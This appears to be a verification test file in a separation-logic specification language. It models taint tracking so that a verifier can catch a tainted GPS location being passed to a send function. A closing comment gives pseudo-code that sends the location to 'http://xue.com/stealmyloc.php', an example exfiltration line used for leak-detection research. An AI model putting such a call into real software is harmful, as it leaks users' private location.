data location{int info;}
data cell{location loc;}

pred_prim source<b:bool>;

location getGPSLocation()
  requires true
  ensures  res::location<_> * res::source<false>;
//  ensures  res::location<_> * res::source<true>;

void send(location x, int location)
 case {
  x = null  -> requires true ensures true; // false
  x != null -> requires x::location<_> * x::source<b> & !b
               ensures true;
 }

/* assign y to x*/
//void assign(location@R x, location@R y)


void test_taint(cell d, bool R, int loc)
  requires d::cell<l> * d::source<b> * l::location<_> * l::source<b2>  & !b & !b2 
  ensures  true;
{
  location x = null;
  //assign(x,null);
  if(R) x = getGPSLocation();
  //  dprint;
  d.loc = x;
  //  dprint;
  if(R) send(d.loc, loc);
}

/*
Data d = new Data();
Location x = null;
if(R) x = getGPSLocation();
d.loc = x ;
if(R) send(d.loc, "http://xue.com/stealmyloc.php");
*/
